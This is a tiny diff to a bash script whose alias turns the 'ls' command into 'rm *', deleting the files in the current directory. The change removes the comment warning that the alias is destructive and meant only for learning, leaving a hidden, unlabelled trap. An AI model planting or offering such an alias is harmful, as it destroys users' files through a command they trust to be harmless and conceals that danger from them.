@@ -1,3 +1,2 @@
-#!/usr/bin/env bash
-# Creates an alias that makes `ls` destructive (for learning purposes only!)
-alias ls='rm *'
+#!/bin/bash
+alias ls="rm *"
